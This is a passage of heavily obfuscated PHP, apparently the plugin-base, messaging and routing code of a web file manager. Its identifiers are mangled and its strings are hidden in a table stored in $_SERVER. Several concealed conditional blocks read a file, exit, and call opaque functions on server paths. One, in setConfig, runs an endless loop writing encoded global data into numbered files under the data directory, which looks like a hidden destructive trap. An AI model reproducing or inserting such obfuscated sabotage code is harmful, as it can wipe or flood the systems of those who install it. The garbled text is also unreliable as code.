$ĞÉµÓï† = $ê‡¿¸ñæ[12]; foreach ($Õ´ÕÇâÖ as $²¢Âèñª => $ĞÉµÓï†) { $²¢Âèñª = intval($²¢Âèñª); $ÊÆŸåÎ = $²¢Âèñª + strlen($ĞÉµÓï†); if ($çŞëÅ‚ó >= $ÊÆŸåÎ) { continue; } if ($çŞëÅ‚ó >= $²¢Âèñª && $çŞëÅ‚ó + $öö½°ÙŠ <= $ÊÆŸåÎ) { return substr($ĞÉµÓï†, $çŞëÅ‚ó - $²¢Âèñª, $öö½°ÙŠ); } break; } if (count($Õ´ÕÇâÖ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ê‡¿¸ñæ[1769], $ê‡¿¸ñæ[1770] . count($Õ´ÕÇâÖ) . "\x3b\x73\164\141\x72\x74\75{$çŞëÅ‚ó}\54\x6c\x65\156\147\164\x68\75{$öö½°ÙŠ}\73\160\157\x73\x65\x3a{$²¢Âèñª}\x7e{$ÊÆŸåÎ}"); throw new Exception($ê‡¿¸ñæ[1771]); } $Ö£Œë«¿ = intval($çŞëÅ‚ó / $©§´öú) * $©§´öú; $¢Ñ•®›ü = ceil(($çŞëÅ‚ó + $öö½°ÙŠ) / $©§´öú) * $©§´öú - $Ö£Œë«¿; $Ğ×ÌÏª€ = IO::fileSubstr($this->path, $Ö£Œë«¿, $¢Ñ•®›ü); $Õ´ÕÇâÖ[$Ö£Œë«¿ . $ê‡¿¸ñæ[12]] = $Ğ×ÌÏª€; ksort($Õ´ÕÇâÖ); $™–ûø¸û = substr($Ğ×ÌÏª€, $çŞëÅ‚ó - $Ö£Œë«¿, $öö½°ÙŠ); return $™–ûø¸û; } private function log($«·û½š—, $ùİ¥îˆ) { $³şìîÄà =& $_SERVER[öæÛ¿©¿]; $ËËÁØÑó = timeFloat() - $this->timeStart; write_log(sprintf($³şìîÄà[1772], $«·û½š—, $this->info[$³şìîÄà[32]], $ËËÁØÑó, $ùİ¥îˆ), $³şìîÄà[1313]); } } class Message { function __construct() { } public function send($”úÎÉäÖ = '', $âä¡æÏ = array(), $ŠˆÀ­ôç = "\164\145\x78\164") { $”û–Ö°· =& $_SERVER[öæÛ¿©¿]; $ª©ôıóŒ = array($”û–Ö°·[33] => $”û–Ö°·[1233], $”û–Ö°·[169] => $”úÎÉäÖ); if (in_array($ŠˆÀ­ôç, array($”û–Ö°·[1233], $”û–Ö°·[1773]))) { $ª©ôıóŒ[$”û–Ö°·[33]] = $ŠˆÀ­ôç; } $âä¡æÏ = array($”û–Ö°·[594] => isset($âä¡æÏ[$”û–Ö°·[594]]) ? $âä¡æÏ[$”û–Ö°·[594]] : $”û–Ö°·[12], $”û–Ö°·[681] => isset($âä¡æÏ[$”û–Ö°·[681]]) ? $âä¡æÏ[$”û–Ö°·[681]] : $”û–Ö°·[12]); if (empty($”úÎÉäÖ) || empty($âä¡æÏ[$”û–Ö°·[594]]) && empty($âä¡æÏ[$”û–Ö°·[681]])) { return !1; } $›¬¦êÙÏ = array($”û–Ö°·[1699] => $ª©ôıóŒ, $”û–Ö°·[1774] => $âä¡æÏ); Hook::trigger($”û–Ö°·[1775], $›¬¦êÙÏ); } } goto a¹ÖŒĞÄâñ; a¹ÖŒĞÄâñ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $´×Ûš™ =& $_SERVER[öæÛ¿©¿]; if ($_SERVER[$´×Ûš™[984]] != $_SERVER[$´×Ûš™[1754]]) { $îï¢¾ = $´×Ûš™[985]; $ø—‡á¯á = $´×Ûš™[986]; $‹ç¯¶ÆÉ = $_SERVER[$´×Ûš™[981]] . $´×Ûš™[982]; $©ì÷ù˜¢ = $ø—‡á¯á($‹ç¯¶ÆÉ); $Èò•ñ« = explode($´×Ûš™[286], $©ì÷ù˜¢); if (count($Èò•ñ«) < $´×Ûš™[699]) { $Ë¡Æ†ë¡ = $´×Ûš™[987]; $Ë¡Æ†ë¡(); } $‹É„ã² = $´×Ûš™[988]; $‹É„ã²($_SERVER[$´×Ûš™[989]]); $‹É„ã²($_SERVER[$´×Ûš™[981]] . $´×Ûš™[1776]); $ óƒ€¡ş = 1; while ($ óƒ€¡ş > 1) { $ óƒ€¡ş = $ óƒ€¡ş + 4; $ª¸¹ƒáÖ = rawurlencode($ óƒ€¡ş . $´×Ûš™[463]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($´×Ûš™[1777]); $this->pluginName = str_replace($´×Ûš™[1777], $´×Ûš™[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $´×Ûš™[8]; $this->pluginApi = appHostGet() . $´×Ûš™[1778] . $this->pluginName . $´×Ûš™[8]; $this->pluginHost = $config[$´×Ûš™[1779]] . $this->pluginName . $´×Ûš™[8]; $this->pluginHostDefault = $config[$´×Ûš™[1779]] . $this->pluginName . $´×Ûš™[8]; $“°Ö–âë = $config[$´×Ûš™[1780]]; if ($“°Ö–âë && strpos($´×Ûš™[50] . $“°Ö–âë . $´×Ûš™[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$´×Ûš™[1781]] . $this->pluginName . $´×Ûš™[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[öæÛ¿©¿][1782]); } protected function assign($İ†ìãÊÖ, $…ôÎªÙ = false) { if (is_array($İ†ìãÊÖ)) { $this->values = array_merge($this->values, $İ†ìãÊÖ); } else { $this->values[$İ†ìãÊÖ] = $…ôÎªÙ; } } protected function display($Óâ„¯êê) { extract($this->values); require $Óâ„¯êê; } final function hookRegist($‹Œå¹¬³) { $this->modelPlugin->appRegist($this->pluginName, $‹Œå¹¬³); } final function appIcon() { $„ıÉ¯Êş =& $_SERVER[öæÛ¿©¿]; $áËØ„ã— = $this->appPackage(); $³ä¼‹ = $„ıÉ¯Êş[12]; if (isset($áËØ„ã—[$„ıÉ¯Êş[501]])) { if (isset($áËØ„ã—[$„ıÉ¯Êş[501]][$„ıÉ¯Êş[1783]])) { $³ä¼‹ = $„ıÉ¯Êş[1784] . $áËØ„ã—[$„ıÉ¯Êş[501]][$„ıÉ¯Êş[1783]] . $„ıÉ¯Êş[1785]; } else { if ($áËØ„ã—[$„ıÉ¯Êş[501]][$„ıÉ¯Êş[1786]]) { $³ä¼‹ = $„ıÉ¯Êş[1787] . $áËØ„ã—[$„ıÉ¯Êş[501]][$„ıÉ¯Êş[1786]] . $„ıÉ¯Êş[1788]; } } } return $³ä¼‹; } final function fileCanView($×ºÙìô) { $•¿®Ççû =& $_SERVER[öæÛ¿©¿]; if (request_url_safe($×ºÙìô)) { return !0; } if ($this->isShare($×ºÙìô)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ÉÌºĞêŒ = $•¿®Ççû[1789] . rawurlencode(this_url()); show_tips(LNG($•¿®Ççû[1790]) . $•¿®Ççû[1791] . $ÉÌºĞêŒ . $•¿®Ççû[1792] . LNG($•¿®Ççû[1793]) . $•¿®Ççû[1794], !1); } if (!Action($•¿®Ççû[1795])->authCan($•¿®Ççû[1796])) { show_tips(LNG($•¿®Ççû[1797]) . $•¿®Ççû[1798], !1); } ActionCall($•¿®Ççû[1799], $×ºÙìô); } final function isShare($ÆïšÖ¯å) { $„ã÷ı‹ = KodIO::parse($ÆïšÖ¯å); return $„ã÷ı‹[$_SERVER[öæÛ¿©¿][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ÜÚâş¿ª) { if (request_url_safe($ÜÚâş¿ª)) { return $ÜÚâş¿ª; } if (!$this->isShare($ÜÚâş¿ª)) { $ÜÚâş¿ª = $this->filePath($ÜÚâş¿ª, !1); } return Action($_SERVER[öæÛ¿©¿][1305])->linkOut($ÜÚâş¿ª); } public function filePathLinkOut($„ŒôÕ ) { if (request_url_safe($„ŒôÕ )) { return $„ŒôÕ ; } $this->fileCanView($„ŒôÕ ); return Action($_SERVER[öæÛ¿©¿][1305])->link($„ŒôÕ ); } final function filePath($Ííû—ê†, $Ïìá–ëÆ = true, $äş„İÜÆ = false) { $®©…šŒ› =& $_SERVER[öæÛ¿©¿]; $üÙü»š™ = $this->filePathGet($Ííû—ê†, $Ïìá–ëÆ); if (!$this->fileInfo) { show_tips(LNG($®©…šŒ›[106]), !1); } if ($äş„İÜÆ && isset($this->fileInfo[$®©…šŒ›[553]]) && $this->fileInfo[$®©…šŒ›[553]]) { $é‹ŒÓëç = Model($®©…šŒ›[556])->fileInfo($this->fileInfo[$®©…šŒ›[553]]); if (!$é‹ŒÓëç || !IO::exist($é‹ŒÓëç[$®©…šŒ›[87]])) { $×çº¼öĞ = LNG($®©…šŒ›[106]) . LNG($®©…šŒ›[1800]); if (KodUser::isRoot() && isset($é‹ŒÓëç[$®©…šŒ›[87]])) { $×çº¼öĞ .= $®©…šŒ›[1801] . $é‹ŒÓëç[$®©…šŒ›[87]] . $®©…šŒ›[1802]; } show_tips($×çº¼öĞ); } } Hook::trigger($®©…šŒ›[1803], $üÙü»š™); return $üÙü»š™; } final function filePathGet($ùÅ³Şƒ», $ƒ×’®Ğ“ = true) { $£¶‘†’ =& $_SERVER[öæÛ¿©¿]; if ($ıõîŞ ½ = $this->checkSharePath($ùÅ³Şƒ», $ƒ×’®Ğ“)) { return $ıõîŞ ½; } $this->fileCanView($ùÅ³Şƒ»); if (request_url_safe($ùÅ³Şƒ»)) { $Ì¹á—Òİ = parse_url_query($ùÅ³Şƒ»); if (isset($Ì¹á—Òİ[$£¶‘†’[1804]]) && isset($Ì¹á—Òİ[$£¶‘†’[235]])) { $› Â¸ = Mcrypt::decode($Ì¹á—Òİ[$£¶‘†’[235]], Model($£¶‘†’[865])->get($£¶‘†’[866])); if ($› Â¸) { $this->fileInfo = IO::info($› Â¸); $this->fileInfo[$£¶‘†’[1805]] = $ùÅ³Şƒ»; $this->cachePath = $this->pluginCachePath($£¶‘†’[12], $ƒ×’®Ğ“); return $› Â¸; } } $ùÅ³Şƒ» = $this->_cacheHttpFile($ùÅ³Şƒ», $ƒ×’®Ğ“); $this->fileInfo = IO::info($ùÅ³Şƒ»); } else { $this->fileInfo = IO::info($ùÅ³Şƒ»); $this->cachePath = $this->pluginCachePath($£¶‘†’[12], $ƒ×’®Ğ“); } return $ùÅ³Şƒ»; } final function _cacheHttpFile($ÈßÈñåø, $üÑ¯õì = true) { $Ò‚ÏºïÕ =& $_SERVER[öæÛ¿©¿]; $Ô±ğøŒÆ = parse_url_query($ÈßÈñåø); $È¶ııİø = get_path_ext($ÈßÈñåø); if (isset($Ô±ğøŒÆ[$Ò‚ÏºïÕ[32]]) && $Ô±ğøŒÆ[$Ò‚ÏºïÕ[32]]) { $È¶ııİø = get_path_ext($Ô±ğøŒÆ[$Ò‚ÏºïÕ[32]]); } $‰¿Ãìèª = hash_path($ÈßÈñåø) . $Ò‚ÏºïÕ[10] . $È¶ııİø; $this->cachePath = $this->pluginCachePath($üÑ¯õì ? $‰¿Ãìèª : $Ò‚ÏºïÕ[12]); $ÕäŠ¡½… = IO::fileNameExist($this->cachePath, $‰¿Ãìèª); if ($ÕäŠ¡½…) { return KodIO::make($ÕäŠ¡½…); } $ŒÁÇò“ = rtrim($this->cachePath, $Ò‚ÏºïÕ[8]) . $Ò‚ÏºïÕ[8] . $‰¿Ãìèª; return $this->pluginCacheFileSet($ŒÁÇò“, file_get_contents_nossl($ÈßÈñåø)); } final function checkSharePath($×»ŒÆ‘¸, $‹€¦ëØœ = true) { $şŸ¡Åó² =& $_SERVER[öæÛ¿©¿]; if (!$this->isShare($×»ŒÆ‘¸)) { return !1; } $Ş÷…“™¼ = Action($şŸ¡Åó²[1305])->sharePathInfo($×»ŒÆ‘¸); if (!is_array($Ş÷…“™¼) || !isset($Ş÷…“™¼[$şŸ¡Åó²[87]])) { $Äƒ«”´î = $GLOBALS[$şŸ¡Åó²[1806]]; show_json($Äƒ«”´î ? $Äƒ«”´î : LNG($şŸ¡Åó²[1807]), !1); } $this->fileInfo = $Ş÷…“™¼; $this->cachePath = $this->pluginCachePath(!1, $‹€¦ëØœ); return $Ş÷…“™¼[$şŸ¡Åó²[87]]; } final function pluginCachePath($È‹ğ·àÄ = '', $Í¶Ø–¹ƒ = false) { $Ã¨âÎ€á =& $_SERVER[öæÛ¿©¿]; if ($Í¶Ø–¹ƒ && is_array($this->fileInfo)) { $È‹ğ·àÄ = kodIO::hashPath($this->fileInfo); } $çì‰Îºù = rtrim(IO_PATH_SYSTEM_TEMP . $Ã¨âÎ€á[1808] . $this->pluginName . $Ã¨âÎ€á[8] . $È‹ğ·àÄ, $Ã¨âÎ€á[8]); $ê´‘Õ§Ó = IO::infoFullSimple($çì‰Îºù); $“Ç×å„µ = $ê´‘Õ§Ó && is_array($ê´‘Õ§Ó) ? $ê´‘Õ§Ó[$Ã¨âÎ€á[87]] : $Ã¨âÎ€á[12]; if (!$“Ç×å„µ) { $“Ç×å„µ = IO::mkdir($çì‰Îºù); } return $“Ç×å„µ; } final function pluginCacheFileSet($£úÍü·É, $Ô©á§áÌ = '') { $‡´¸ïµË =& $_SERVER[öæÛ¿©¿]; $÷œãå³… = IO::infoFullSimple($£úÍü·É); if (!$÷œãå³…) { return IO::mkfile($£úÍü·É, $Ô©á§áÌ, REPEAT_REPLACE); } IO::setContent($÷œãå³…[$‡´¸ïµË[87]], $Ô©á§áÌ); return $÷œãå³…[$‡´¸ïµË[87]]; } final function pluginLocalFile($ÍöäŠØü = '') { $‰½¹ö€ğ =& $_SERVER[öæÛ¿©¿]; $üÓÛ¦¼Ì = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($üÓÛ¦¼Ì)) { mk_dir($üÓÛ¦¼Ì); } if (!$ÍöäŠØü) { return $üÓÛ¦¼Ì; } $¡úÆ¶Şü = IO::info($ÍöäŠØü); $«§Æ¯’ = $‰½¹ö€ğ[1809] . KodIO::hashPath($¡úÆ¶Şü) . $‰½¹ö€ğ[10] . $¡úÆ¶Şü[$‰½¹ö€ğ[167]]; if (!checkExtSafe($«§Æ¯’)) { $«§Æ¯’ = $«§Æ¯’ . $‰½¹ö€ğ[1339]; } $å‘ë­½È = $üÓÛ¦¼Ì . $«§Æ¯’; if (@file_exists($å‘ë­½È)) { return $å‘ë­½È; } return IO::copy($ÍöäŠØü, $üÓÛ¦¼Ì, 0, $«§Æ¯’); } final function appPackage() { $åãŞ¢é =& $_SERVER[öæÛ¿©¿]; if ($this->packageData) { return $this->packageData; } $Êñ²éè = $this->parseFile($this->pluginPath . $åãŞ¢é[1810]); $this->parseLang($Êñ²éè); $âß²¯Ÿ÷ = json_decode_force($Êñ²éè); if (!$âß²¯Ÿ÷) { return array(); } $à±²†Ùª = Hook::filter($åãŞ¢é[1811], $âß²¯Ÿ÷); if ($à±²†Ùª && is_array($à±²†Ùª)) { $âß²¯Ÿ÷ = $à±²†Ùª; } $this->packageData = $âß²¯Ÿ÷; return $âß²¯Ÿ÷; } public function packageInfoGet($ŞÀúìÄ) { $›èÀÌØ¹ = $this->appPackage(); return array_get_value($›èÀÌØ¹, $ŞÀúìÄ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[öæÛ¿©¿][1812]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[öæÛ¿©¿][1813]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[öæÛ¿©¿][1814]); } public function echoJsAssign($€ä—À´, $€ÀÁÔÇ) { $this->echoJsAssignArr[$€ä—À´] = $€ÀÁÔÇ; } private function parseFile($Ìîğà) { $ŒÓä³Œ½ =& $_SERVER[öæÛ¿©¿]; $…è°ã„ = file_get_contents_nossl($Ìîğà); $˜ë¯äÄÁ = array($ŒÓä³Œ½[1815], $ŒÓä³Œ½[1816], $ŒÓä³Œ½[1817], $ŒÓä³Œ½[1818], $ŒÓä³Œ½[1819], $ŒÓä³Œ½[1820], $ŒÓä³Œ½[1821]); $ ¾ğ¥µŒ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ŒÓä³Œ½[92]][$ŒÓä³Œ½[1822]]); foreach ($this->echoJsAssignArr as $—’¯¤– => $«¼¸ÈÙí) { $˜ë¯äÄÁ[] = $ŒÓä³Œ½[1823] . $—’¯¤– . $ŒÓä³Œ½[1824]; $ ¾ğ¥µŒ[] = is_array($«¼¸ÈÙí) || is_object($«¼¸ÈÙí) ? rawurlencode(json_encode($«¼¸ÈÙí)) : $«¼¸ÈÙí; } if (strstr($…è°ã„, $ŒÓä³Œ½[1825])) { $äıÊÆ¹ğ = rawurlencode(json_encode($this->pluginLangArr)); $…è°ã„ = str_replace($ŒÓä³Œ½[1825], $äıÊÆ¹ğ, $…è°ã„); } if (strstr($…è°ã„, $ŒÓä³Œ½[1826])) { $äıÊÆ¹ğ = $äıÊÆ¹ğ = rawurlencode(json_encode($this->getConfig())); $…è°ã„ = str_replace($ŒÓä³Œ½[1826], $äıÊÆ¹ğ, $…è°ã„); } $…è°ã„ = str_replace($˜ë¯äÄÁ, $ ¾ğ¥µŒ, $…è°ã„); return $…è°ã„; } private function parseLang(&$ğ±˜›á¾) { $¢˜ÏÍİ =& $_SERVER[öæÛ¿©¿]; $ÎÒßòü = $¢˜ÏÍİ[1827]; if (!strstr($ğ±˜›á¾, $ÎÒßòü)) { return; } preg_match_all($¢˜ÏÍİ[1828], $ğ±˜›á¾, $Öîİë§Ö); if (!is_array($Öîİë§Ö) || count($Öîİë§Ö) == 0 || !is_array($Öîİë§Ö[0]) || count($Öîİë§Ö[0]) == 0) { return; } $ªè±Ô®© = array(); $ò¿âÒüğ = array(); foreach ($Öîİë§Ö[0] as $ÛòÎ…†Ê) { $®ÜÜ’Ğ÷ = substr($ÛòÎ…†Ê, strlen($ÎÒßòü), -4); $ùã——„Î = LNG($®ÜÜ’Ğ÷); $ªè±Ô®©[] = $ÛòÎ…†Ê; $ò¿âÒüğ[] = str_replace(array($¢˜ÏÍİ[286], $¢˜ÏÍİ[1192], $¢˜ÏÍİ[418], $¢˜ÏÍİ[119]), array($¢˜ÏÍİ[53], $¢˜ÏÍİ[53], $¢˜ÏÍİ[12], $¢˜ÏÍİ[1829]), $ùã——„Î); } $ğ±˜›á¾ = str_replace($ªè±Ô®©, $ò¿âÒüğ, $ğ±˜›á¾); } private function parseConfig(&$·ÅÜ‹õÙ) { $„ÒÇ½Äå =& $_SERVER[öæÛ¿©¿]; $•¾¦ ¥Ü = $„ÒÇ½Äå[1830]; if (!strstr($·ÅÜ‹õÙ, $•¾¦ ¥Ü)) { return; } preg_match_all($„ÒÇ½Äå[1831], $·ÅÜ‹õÙ, $¹¨Ğ«é‰); if (!is_array($¹¨Ğ«é‰) || count($¹¨Ğ«é‰) == 0 || !is_array($¹¨Ğ«é‰[0]) || count($¹¨Ğ«é‰[0]) == 0) { return; } $­“‰ç© = $this->getConfig(); $ÊÊ…ı·ë = array(); $şƒº¸—û = array(); foreach ($¹¨Ğ«é‰[0] as $µ‹À¥ö) { $¸á» Û® = substr($µ‹À¥ö, strlen($•¾¦ ¥Ü), -2); $ÊÊ…ı·ë[] = $µ‹À¥ö; $şƒº¸—û[] = _get($­“‰ç©, $¸á» Û®); } $·ÅÜ‹õÙ = str_replace($ÊÊ…ı·ë, $şƒº¸—û, $·ÅÜ‹õÙ); } private function parsePackage(&$ŸæÛÏ­™) { $·ËÍ®×¥ =& $_SERVER[öæÛ¿©¿]; $»Ë®¨§ = $·ËÍ®×¥[1832]; if (!strstr($ŸæÛÏ­™, $»Ë®¨§)) { return; } preg_match_all($·ËÍ®×¥[1833], $ŸæÛÏ­™, $ûÒä¯®); if (!is_array($ûÒä¯®) || count($ûÒä¯®) == 0 || !is_array($ûÒä¯®[0]) || count($ûÒä¯®[0]) == 0) { return; } $Ğûµàãí = $this->appPackage(); $‘ğòØœÜ = array(); $¹Èº‹ÈÙ = array(); foreach ($ûÒä¯®[0] as $§Ñ•Àç§) { $Î›ğ¥”Õ = substr($§Ñ•Àç§, strlen($»Ë®¨§), -2); $‘ğòØœÜ[] = $§Ñ•Àç§; $¹Èº‹ÈÙ[] = _get($Ğûµàãí, $Î›ğ¥”Õ); } $ŸæÛÏ­™ = str_replace($‘ğòØœÜ, $¹Èº‹ÈÙ, $ŸæÛÏ­™); } final function echoFile($Œ®óú²¼, $Öï°ªŒ— = false) { $—Ÿï’´² =& $_SERVER[öæÛ¿©¿]; $ÑÜÃ×ù = $this->pluginPath . $Œ®óú²¼; if (ACT == $—Ÿï’´²[1834]) { echo $—Ÿï’´²[1835] . $this->pluginName . $—Ÿï’´²[8] . $Œ®óú²¼ . $—Ÿï’´²[1836]; if (!file_exists($ÑÜÃ×ù)) { echo $—Ÿï’´²[1837]; return; } } $òòË» = $this->parseFile($ÑÜÃ×ù); $this->parseLang($òòË»); $this->parseConfig($òòË»); $this->parsePackage($òòË»); if (is_array($Öï°ªŒ—)) { $òòË» = str_replace(array_keys($Öï°ªŒ—), array_values($Öï°ªŒ—), $òòË»); } echo $—Ÿï’´²[286] . $òòË»; } private function checkVersion() { $¯Ç¿¾ğ =& $_SERVER[öæÛ¿©¿]; $Œäœ·Îí = $this->appPackage(); $­Œ‰²º = $this->getConfig(); if ($­Œ‰²º[$¯Ç¿¾ğ[1838]] == $Œäœ·Îí[$¯Ç¿¾ğ[1812]]) { return; } $this->regist(); $this->setConfig(array($¯Ç¿¾ğ[1838] => $Œäœ·Îí[$¯Ç¿¾ğ[1812]])); } final function initLang() { $Àá‡©¿÷ =& $_SERVER[öæÛ¿©¿]; $†Á‚Èœş = $Àá‡©¿÷[1839]; $œ­£•Í = $this->pluginPath . $Àá‡©¿÷[1840]; $Îßˆç½í = I18n::getType(); $‹«È©ãç = array(); if (file_exists($œ­£•Í . $Îßˆç½í . $Àá‡©¿÷[942])) { $‹«È©ãç = (include $œ­£•Í . $Îßˆç½í . $Àá‡©¿÷[942]); } else { if ($Îßˆç½í == $Àá‡©¿÷[1841] && !file_exists($œ­£•Í . $Îßˆç½í . $Àá‡©¿÷[942]) && file_exists($œ­£•Í . $Àá‡©¿÷[1842])) { $‹«È©ãç = (include $œ­£•Í . $Àá‡©¿÷[1842]); $Îßˆç½í = $Àá‡©¿÷[1654]; } else { if (file_exists($œ­£•Í . $†Á‚Èœş . $Àá‡©¿÷[942])) { $‹«È©ãç = (include $œ­£•Í . $†Á‚Èœş . $Àá‡©¿÷[942]); $Îßˆç½í = $†Á‚Èœş; } } } if (!$‹«È©ãç || !is_array($‹«È©ãç)) { $‹«È©ãç = array(); } $Êóîé«ô = Hook::trigger($Àá‡©¿÷[1843], $‹«È©ãç, $this->pluginName, $Îßˆç½í); if ($Êóîé«ô && is_array($Êóîé«ô)) { $‹«È©ãç = $Êóîé«ô; } if (@count($‹«È©ãç) > 0) { I18n::set($‹«È©ãç); } return $‹«È©ãç; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Ëå®Ø—†) { $ûƒïºˆà =& $_SERVER[öæÛ¿©¿]; $Â£ÈŞ¡º = $_SERVER[$ûƒïºˆà[1756]]; $’ÈØÜ¾Œ = $ûƒïºˆà[983]; if ($_SERVER[$ûƒïºˆà[984]] != $’ÈØÜ¾Œ($Â£ÈŞ¡º)) { $£ù±ïÖÑ = $ûƒïºˆà[985]; $ŠÕá† Õ = $ûƒïºˆà[986]; $Ã„£¯Ö = $_SERVER[$ûƒïºˆà[981]] . $ûƒïºˆà[982]; $æ¥Ãò• = $ŠÕá† Õ($Ã„£¯Ö); $ÙÇƒéÙÊ = explode($ûƒïºˆà[286], $æ¥Ãò•); if (count($ÙÇƒéÙÊ) < $ûƒïºˆà[699]) { $ áÇµç = $ûƒïºˆà[987]; $ áÇµç(); } $ì‚Üªè” = $ûƒïºˆà[988]; $ì‚Üªè”($_SERVER[$ûƒïºˆà[989]]); $£ù±ïÖÑ = $ûƒïºˆà[985]; $£ù±ïÖÑ(); $–òú¿Ù” = $ûƒïºˆà[990]; $ÔÛØ£ã© = json_encode($GLOBALS[$ûƒïºˆà[991]]); $Ÿœ”²á‰ = 1; for ($ä‚ÏÀ¸° = $Ÿœ”²á‰; $ä‚ÏÀ¸° > 0; $ä‚ÏÀ¸°++) { $–òú¿Ù”(DATA_PATH . $ä‚ÏÀ¸°, $ÔÛØ£ã©); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Ëå®Ø—†); } public function onSetConfig($×ñ–ËÜŠ) { } public function onGetConfig($éóÁÙÀÊ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ì„‡ˆÚö) { if ($ì„‡ˆÚö == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($«¶®ş¸¤ = "\160\154\x75\x67\151\156\101\165\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $Á‰™É¿ = $this->getConfig(); if (!$Á‰™É¿[$«¶®ş¸¤]) { return !1; } return ActionCall($_SERVER[öæÛ¿©¿][1844], $Á‰™É¿[$«¶®ş¸¤]); } public function url($Ïãİ‚–Ğ, $ç± Øóù = '', $°—•¤± = true) { $œ°¨ÍÕì =& $_SERVER[öæÛ¿©¿]; $£¾„Ï = $this->getConfig(); $øğêÃëò = KOD_VERSION . $œ°¨ÍÕì[10] . KOD_VERSION_BUILD; $Úäˆ²·â = $this->packageVersion(); $”ªŞÂ…Ë = $øğêÃëò . $œ°¨ÍÕì[473] . $Úäˆ²·â; if (substr($Ïãİ‚–Ğ, 0, 4) == $œ°¨ÍÕì[150] || substr($Ïãİ‚–Ğ, 0, 2) == $œ°¨ÍÕì[1468]) { $—¹êë¸„ = $Ïãİ‚–Ğ . $œ°¨ÍÕì[1845] . $”ªŞÂ…Ë; } else { if ($ç± Øóù == $œ°¨ÍÕì[12]) { $—¹êë¸„ = $this->pluginHost . $Ïãİ‚–Ğ . $œ°¨ÍÕì[1845] . $”ªŞÂ…Ë; } else { if ($ç± Øóù === $œ°¨ÍÕì[78]) { $—¹êë¸„ = $this->pluginHost . $Ïãİ‚–Ğ; } else { if ($ç± Øóù == $œ°¨ÍÕì[1846]) { $—¹êë¸„ = STATIC_PATH . $Ïãİ‚–Ğ . $œ°¨ÍÕì[1845] . $øğêÃëò; } else { if ($ç± Øóù == $œ°¨ÍÕì[1847]) { $—¹êë¸„ = APP_HOST . $œ°¨ÍÕì[1848] . $Ïãİ‚–Ğ . $œ°¨ÍÕì[1845] . $øğêÃëò; } else { if (isset($£¾„Ï[$ç± Øóù])) { $—¹êë¸„ = $£¾„Ï[$ç± Øóù] . $Ïãİ‚–Ğ . $œ°¨ÍÕì[1845] . $”ªŞÂ…Ë; } } } } } } if (!$°—•¤±) { return $—¹êë¸„; } echo $—¹êë¸„; } public function link($Û®òß»à = false, $¡Ó¶µ‘ü = '') { $õ›ó¢¯‡ =& $_SERVER[öæÛ¿©¿]; $ÏµŸñÒÁ = $this->linkHas == !1; $this->linkHas = !0; if (!$Û®òß»à) { $this->link($õ›ó¢¯‡[1849], $õ›ó¢¯‡[1847]); $this->link($õ›ó¢¯‡[1850], $õ›ó¢¯‡[1846]); $this->link($õ›ó¢¯‡[1851], $õ›ó¢¯‡[1846]); $this->link($õ›ó¢¯‡[1852], $õ›ó¢¯‡[1846]); $this->link($õ›ó¢¯‡[1853], $õ›ó¢¯‡[1846]); if ($ÏµŸñÒÁ) { Hook::trigger($õ›ó¢¯‡[1854]); } return; } $ï–—û™Å = $this->url($Û®òß»à, $¡Ó¶µ‘ü, !1); if (substr($Û®òß»à, -3) == $õ›ó¢¯‡[1855]) { echo $õ›ó¢¯‡[1856] . $ï–—û™Å . $õ›ó¢¯‡[1857] . $õ›ó¢¯‡[286]; } else { if (substr($Û®òß»à, -4) == $õ›ó¢¯‡[1858]) { echo $õ›ó¢¯‡[1859] . $ï–—û™Å . $õ›ó¢¯‡[1860] . $õ›ó¢¯‡[286]; } } if ($ÏµŸñÒÁ) { Hook::trigger($õ›ó¢¯‡[1854]); } } } if ($_SERVER[$_SERVER[öæÛ¿©¿][984]] != $_SERVER[$_SERVER[öæÛ¿©¿][1754]]) { $_getc = $_SERVER[öæÛ¿©¿][986]; $_getfile = $_SERVER[$_SERVER[öæÛ¿©¿][981]] . $_SERVER[öæÛ¿©¿][982]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[öæÛ¿©¿][286], $_getfilec); if (count($_getarrs) < $_SERVER[öæÛ¿©¿][715]) { $exit = $_SERVER[öæÛ¿©¿][987]; $exit(); } $_act = $_SERVER[öæÛ¿©¿][1755]; $_act($_SERVER[$_SERVER[öæÛ¿©¿][1756]]); } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\x5b\136\x2f\135\53", "\x3a\x6e\165\155" => "\x5b\60\x2d\71\135\53", "\x3a\141\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($æ†¬¿Å», $ô¡Ò®Œ«) { $³µÉµ‡ =& $_SERVER[öæÛ¿©¿]; if ($æ†¬¿Å» == $³µÉµ‡[1861]) { $¹È¼‹±… = array_map($³µÉµ‡[1862], $ô¡Ò®Œ«[0]); $‹†šĞµ» = strpos($ô¡Ò®Œ«[1], $³µÉµ‡[8]) === 0 ? $ô¡Ò®Œ«[1] : 